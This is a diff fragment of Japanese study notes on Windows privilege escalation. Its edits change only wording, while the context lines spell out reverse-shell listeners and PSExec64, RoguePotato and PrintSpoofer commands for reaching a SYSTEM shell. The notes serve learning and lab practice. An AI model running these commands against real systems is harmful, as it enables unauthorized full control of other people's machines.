 次にnetcatでlistenしておき、管理者ユーザーとしてRDPにログインし、管理者コマンドプロンプトを起動する。(右クリックして管理者として実行)  
-PSEexec64.exeを使用してlocal serviceアカウントを獲得する。
+PSEexec64.exeを使用してlocal serviceアカウントを取得する。
 ```
 PSExec64.exe -i -u "nt authority\local service" C:\Windows\Temp\reverse.exe
 ```
@@ -2072,7 +2417,7 @@ SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
 SeTimeZonePrivilege           Change the time zone                      Disabled
 ```
 次に、もう一度別のターミナルで、netcatをlistenにしておく。  
-最後にlocal serviceのreverse shellが返ってきているシェルでRoguePotatoエクスプロイトを実行して、SYTEM権限のシェルを獲得する。
+最後にlocal serviceのreverse shellが返ってきているシェルでRoguePotatoエクスプロイトを実行して、SYTEM権限のシェルを取得する。
 ```
 RoguePotato.exe -r <Local IP> -e "C:\Windows\Temp\reverse.exe" -l 9999
 ```
@@ -2090,7 +2435,7 @@ Hot、Rotten、Lonely、Juicy、Rogueは、ポテトエクスプロイトのフ�
 ```
 ### Token Impersonation - PrintSpoofer
 まずは、netcatでlistenしておき管理者ユーザーとしてRDPにログインし、管理者コマンドプロンプトを起動する。(右クリックして管理者として実行)  
-PSEexec64.exeを使用してlocal serviceアカウントを獲得する。
+PSEexec64.exeを使用してlocal serviceアカウントを取得する。
 ```
 PSExec64.exe -i -u "nt authority\local service" C:\Windows\Temp\reverse.exe
 ```
@@ -2100,7 +2445,7 @@ PSExec64.exe -i -u "nt authority\local service" C:\Windows\Temp\reverse.exe
 - SeAssignPrimaryTokenPrivilege
 ここまでの流れとして、先ほどのRogue Potatoと同じ条件となる。  
 
-最後にlocal serviceのreverse shellが返ってきているシェルでPrintSpooferエクスプロイトを実行して、SYTEM権限のシェルを獲得する。
+最後にlocal serviceのreverse shellが返ってきているシェルでPrintSpooferエクスプロイトを実行して、SYTEM権限のシェルを取得する。
 ```
 PrintSpoofer.exe -c "C:\Windows\Temp\reverse.exe(reverse shellペイロードが配置されているパス)" -i
 ```
